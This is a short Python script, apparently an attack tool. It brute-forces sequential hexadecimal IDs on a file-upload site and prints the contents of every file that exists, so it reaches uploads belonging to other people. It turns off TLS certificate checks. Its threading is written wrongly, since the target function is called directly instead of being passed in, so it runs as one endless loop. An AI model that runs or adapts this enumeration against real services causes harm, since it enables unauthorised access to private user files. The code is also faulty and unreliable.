import requests
import urllib3
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#60c87dcb13080
#60c87d0000000


def aaa(link):
    bruted = ""
    integ = link

    while True:
        integ = integ + 1
        bruted = hex(integ)
        bruted = bruted.replace("0x", "")
        req = requests.get("https://files.up2loadbasegram.me/" + bruted + "h2", verify=False, timeout=5)
        if (integ % 100) == 0:
            print(bruted)
        if req.text.find("<title>Uploaded file not found</title>") == -1:
            print(req.text)

    return


l1 = 0x60c87dcb
t1=threading.Thread(target=aaa(l1))
t1.join()
l2 = 0x60c87dcc
t2=threading.Thread(target=aaa(l2))
t2.join()

print("END")
